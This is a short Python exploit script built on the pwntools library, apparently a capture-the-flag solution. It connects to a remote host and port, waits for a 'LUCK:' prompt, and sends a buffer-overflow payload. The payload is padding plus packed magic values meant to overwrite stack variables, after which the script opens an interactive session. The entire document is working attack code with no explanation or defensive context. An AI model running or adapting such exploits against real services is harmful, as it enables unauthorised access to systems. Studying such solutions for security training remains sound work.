from pwn import *

r = remote('140.110.112.77', 2111)
r.recvuntil('LUCK:')
r.sendline('a' * 4 + p32(0xffffffff) + 'a' * 4 + p32(0xFACEB00C) + p32(0xDEADBEEF) + p32(0xffffffff))
r.interactive()
